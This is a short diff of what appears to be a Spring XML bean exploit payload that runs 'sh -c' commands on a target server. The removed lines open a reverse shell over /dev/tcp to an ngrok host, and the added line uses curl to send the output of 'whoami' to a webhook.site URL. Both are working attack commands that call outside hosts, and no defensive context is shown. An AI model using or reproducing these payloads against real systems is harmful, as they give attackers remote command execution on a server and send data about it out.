@@ -9,11 +9,7 @@
             <list>
                 <value>sh</value>
                 <value>-c</value>
-                <value>
-                    <![CDATA[
-                    exec 5<>/dev/tcp/0.tcp.ap.ngrok.io/19271;cat <&5 | while read line; do $line 2>&5 >&5; done
-                    ]]>
-                </value>
+                <value>curl https://webhook.site/9eff54fa-9345-4552-a206-e43abc304e57/$(whoami)</value>
             </list>
         </constructor-arg>
     </bean>
